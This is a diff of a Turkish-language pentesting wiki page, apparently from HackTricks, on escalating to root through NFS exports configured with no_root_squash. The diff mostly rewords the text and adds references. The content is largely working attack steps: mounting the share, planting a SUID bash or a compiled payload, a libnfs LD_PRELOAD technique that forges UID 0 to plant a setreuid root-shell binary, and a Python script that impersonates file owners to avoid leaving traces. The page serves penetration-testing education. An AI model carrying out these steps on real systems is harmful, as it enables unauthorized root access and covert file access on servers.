@@ -1,16 +1,14 @@
 # NFS No Root Squash Misconfiguration Privilege Escalation
 
-{{#include ../../banners/hacktricks-training.md}}
-
 ## Squashing Temel Bilgiler
 
-NFS genellikle (özellikle Linux'ta), bağlanan client tarafından dosyalara erişmek için belirtilen `uid` ve `gid` değerlerine güvenir (Kerberos kullanılmıyorsa). Ancak, server üzerinde bu **davranışı değiştirmek** için ayarlanabilecek bazı yapılandırmalar vardır:
+NFS AUTH_SYS/AUTH_UNIX ile sunucu, dosya izin kontrollerini her RPC isteğinde gönderilen `uid` ve `gid` değerlerine göre yapar. Kerberos gibi diğer security flavor'lar farklı kimlik bilgileri kullanır ve sunucu, izinleri kontrol etmeden önce sayısal kimlik bilgilerini eşleyebilir.<sup>[[4]](#references)[[5]](#references)</sup>
 
-- **`all_squash`**: Her kullanıcı ve grubu **`nobody`** (65534 unsigned / -2 signed) ile eşleyerek tüm erişimleri squash eder. Bu nedenle herkes `nobody` olur ve hiçbir kullanıcı kullanılmaz.
-- **`root_squash`/`no_all_squash`**: Linux'ta varsayılan davranıştır ve **yalnızca uid 0 (root) ile yapılan erişimleri squash eder**. Bu nedenle herhangi bir `UID` ve `GID` güvenilir kabul edilir, ancak `0` değeri `nobody` ile squash edilir (dolayısıyla root impersonation mümkün değildir).
-- **``no_root_squash`**: Bu yapılandırma etkinleştirildiğinde root kullanıcısını bile squash etmez. Bu, bu yapılandırmaya sahip bir directory'yi mount ederseniz ona root olarak erişebileceğiniz anlamına gelir.
+- **`all_squash`**: Her UID ve GID'yi varsayılan olarak Linux'ta `nobody` (65534) olan anonymous hesaba eşler. `no_all_squash`, root olmayan istekler için varsayılandır.<sup>[[4]](#references)</sup>
+- **`root_squash`**: Linux'ta varsayılandır ve UID/GID 0 (root) içeren istekleri anonymous hesaba eşler; diğer UID ve GID'ler squash edilmez.<sup>[[4]](#references)</sup>
+- **`no_root_squash`**: Root squashing'i devre dışı bırakır; böylece UID/GID 0 içeren istekler sunucuda root olarak değerlendirilebilir.<sup>[[4]](#references)</sup>
 
-**/etc/exports** dosyasında **no_root_squash** olarak yapılandırılmış bir directory bulursanız, bu directory'ye **client olarak erişebilir** ve içine makinenin yerel **root** kullanıcısıymışsınız **gibi yazabilirsiniz**.
+İzin verilen bir client, **`no_root_squash`** ile yapılandırılmış, yazılabilir bir export'u **`/etc/exports`** içinde mount edebiliyorsa UID/GID 0 istekleri sunucunun root kullanıcısı olarak buraya yazabilir.<sup>[[4]](#references)</sup>
 
 **NFS** hakkında daha fazla bilgi için:
 
@@ -23,9 +21,8 @@ NFS genellikle (özellikle Linux'ta), bağlanan client tarafından dosyalara eri
 ### Remote Exploit
 
 Bash kullanarak Option 1:
-- Bir client makinesinde **bu directory'yi mount etmek**, ardından **root olarak kopyalayarak** mount edilen folder'ın içine **/bin/bash** binary'sini koymak ve ona **SUID** hakları vermek; daha sonra bu bash binary'sini **victim** makinesinden çalıştırmak.
-- NFS share içinde root olmak için server'da **`no_root_squash`** yapılandırılmış olmalıdır.
-- Ancak etkin değilse, binary'yi NFS share'e kopyalayıp yükselmek istediğiniz kullanıcı olarak SUID permission'ı vererek başka bir user'a privilege escalation yapabilirsiniz.
+- İzin verilen bir client üzerinde yazılabilir bir export'u root olarak mount edin, **`/bin/bash`** dosyasını buraya kopyalayın, **`SUID`** bit'ini ayarlayın ve `nosuid` kullanmayan bir victim mount'ından çalıştırın.<sup>[[2]](#references)[[4]](#references)</sup>
+- Yüklenen dosyanın sahibi root olarak kalması için sunucu **`no_root_squash`** kullanmalıdır. Root squash edilirse başka bir hesap için SUID binary'si, yalnızca client bu dosyayı o hesabın sayısal UID/GID'siyle meşru şekilde oluşturabiliyor veya sahibi olabiliyorsa mümkündür.<sup>[[4]](#references)</sup>
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -38,9 +35,9 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-Option 2, C ile derlenmiş code kullanarak:
-- Bir client makinesinde **bu directory'yi mount etmek**, ardından **root olarak mount edilmiş folder'ın içine**, SUID permission'ını abuse edecek şekilde derlenmiş payload'ımızı kopyalamak, ona **SUID** haklarını vermek ve bu binary'yi **victim** makinesinden **execute etmek** (bazı [C SUID payload'larını](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) burada bulabilirsiniz).
-- Öncekiyle aynı kısıtlamalar
+Derlenmiş C kodu kullanarak 2. seçenek:
+- Dizini izin verilen bir istemciden mount edin, SUID izinlerini kötüye kullanan derlenmiş bir payload kopyalayın, **SUID** bitini ayarlayın ve victim üzerinde çalıştırın (bazı [C SUID payload'larına](../processes-crontab-systemd-dbus/payloads-to-execute.md#c) bakın).
+- Önceki kısıtlamaların aynısı
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -58,17 +55,16 @@ cd <SHAREDD_FOLDER>
 
 > [!TIP]
 > Makinenizden victim machine'e bir **tunnel oluşturabiliyorsanız, gerekli portları tunnelling ederek bu privilege escalation işlemini gerçekleştirmek için Remote version'ı hâlâ kullanabilirsiniz**.\
-> Aşağıdaki trick, `/etc/exports` dosyasının **bir IP belirttiği** durum içindir. Bu durumda **remote exploit'i hiçbir şekilde kullanamazsınız** ve **bu trick'i abuse etmeniz** gerekir.\
-> Exploit'in çalışması için gereken bir diğer koşul, **`/etc/export` içindeki export'un** **`insecure` flag'ini kullanmasıdır**.\
-> --_`/etc/export` bir IP adresi belirtiyorsa bu trick'in çalışıp çalışmayacağından emin değilim_--
+> Aşağıdaki trick, `/etc/exports` export'u victim'ın IP'siyle sınırlandırdığında kullanışlıdır: remote client bunu mount edemez, ancak local technique, izin verilen host üzerinde zaten mount edilmiş share üzerinden çalışabilir.<sup>[[2]](#references)</sup>\
+> Bu unprivileged libnfs method'u için **`/etc/exports`** içindeki export, process'in non-reserved bir source port kullanabilmesi amacıyla `insecure` flag'ini kullanmalıdır; `secure` varsayılandır, ancak reserved bir port'a bind edebilen bir process bu seçeneğe ihtiyaç duymaz.<sup>[[1]](#references)[[4]](#references)</sup>
 
-### Temel Bilgiler
+### Basic Information
 
-Senaryo, local machine üzerinde mount edilmiş bir NFS share'ini exploit etmeyi ve client'ın kendi uid/gid değerini belirtmesine izin veren NFSv3 specification'daki bir flaw'dan yararlanmayı içerir; bu da unauthorized access sağlayabilir. Exploitation, NFS RPC call'larını forge etmeye olanak tanıyan [libnfs](https://github.com/sahlberg/libnfs) kütüphanesinin kullanılmasını içerir.<sup>[[1]](#references)</sup>
+Bir NFSv3 AUTH_UNIX client, her çağrıda effective UID, GID ve gruplarını gönderir ve server bunları permission check'leri için kullanır. Bu local technique, [libnfs](https://github.com/sahlberg/libnfs) aracılığıyla RPC credentials'ı forge ederek bu modeli abuse eder; preload module, NFS context içindeki UID/GID'nin override edilmesini destekler.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[5]](#references)</sup>
 
-#### Kütüphaneyi Derleme
+#### Compiling the Library
 
-Library'nin compilation adımları kernel version'a göre ayarlama gerektirebilir. Bu özel durumda, fallocate syscalls comment out edilmiştir. Compilation process aşağıdaki command'ları içerir:
+libnfs example'ı target kernel için adjustments gerektirebilir; burada kullanılan walkthrough, preload module'ü compile etmeden önce fallocate syscall'larının comment'lenmesi gerektiğini özellikle belirtir.<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 ./bootstrap
 ./configure
@@ -77,7 +73,7 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 #### Exploit'in Gerçekleştirilmesi
 
-Exploit, ayrıcalıkları root seviyesine yükselten ve ardından bir shell çalıştıran basit bir C programı (`pwn.c`) oluşturmayı içerir. Program derlenir ve ortaya çıkan binary (`a.out`), RPC çağrılarında uid değerini taklit etmek için `ld_nfs.so` kullanılarak suid root ile share üzerine yerleştirilir:
+Örnek, bir shell başlatan küçük bir C yardımcı programı oluşturur; ardından bunu share üzerine yerleştirir ve NFS context içinde UID 0 ile `ld_nfs.so` kullanarak SUID-root olmasını sağlar.<sup>[[1]](#references)[[2]](#references)</sup>
 
 1. **Exploit kodunu derleyin:**
 ```bash
@@ -85,21 +81,21 @@ cat pwn.c
 int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
-2. **Exploit'i share üzerine koyun ve uid'yi taklit ederek izinlerini değiştirin:**
+2. **Exploit'i paylaşım üzerine yerleştirin ve UID'yi sahteleyerek izinlerini değiştirin**.<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
 ```
-3. **Root privileges elde etmek için exploit'i çalıştırın:**
+3. **root privileges elde etmek için exploit'i çalıştırın**.<sup>[[2]](#references)</sup>
 ```bash
 /mnt/share/a.out
 #root
 ```
 ### Bonus: Gizli Dosya Erişimi için NFShell
 
-Root erişimi elde edildikten sonra, sahipliği değiştirmeden (iz bırakmaktan kaçınmak için) NFS paylaşımıyla etkileşim kurmak amacıyla bir Python script'i (`nfsh.py`) kullanılır. Bu script, uid değerini erişilen dosyanın uid değeriyle eşleşecek şekilde ayarlar ve böylece paylaşım üzerindeki dosyalarla izin sorunları yaşamadan etkileşim kurulmasını sağlar:<sup>[[1]](#references)</sup>
+Root erişimi elde edildikten sonra bu `nfsh.py` pattern'i, bir komutu çalıştırmadan önce effective UID'yi hedef dosyanın UID'sine ayarlar ve ownership'i recursive olarak değiştirmeden erişime olanak tanır.<sup>[[2]](#references)</sup>
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -123,8 +119,11 @@ os.system(' '.join(sys.argv[1:]))
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-## Referanslar
+## References
 
-- [1] [Daha az bilinen bir NFS privesc hikayesi](https://www.errno.fr/nfs_privesc.html)
-
+- [1] [lnv42/libnfs](https://github.com/lnv42/libnfs)
+- [2] [Daha az bilinen bir NFS privesc hikayesi](https://www.errno.fr/nfs_privesc.html)
+- [3] [sahlberg/libnfs](https://github.com/sahlberg/libnfs)
+- [4] [exports(5) — Linux kılavuz sayfası](https://man7.org/linux/man-pages/man5/exports.5.html)
+- [5] [RFC 1813: NFS Version 3 Protocol Specification](https://datatracker.ietf.org/doc/html/rfc1813)
 {{#include ../../banners/hacktricks-training.md}}
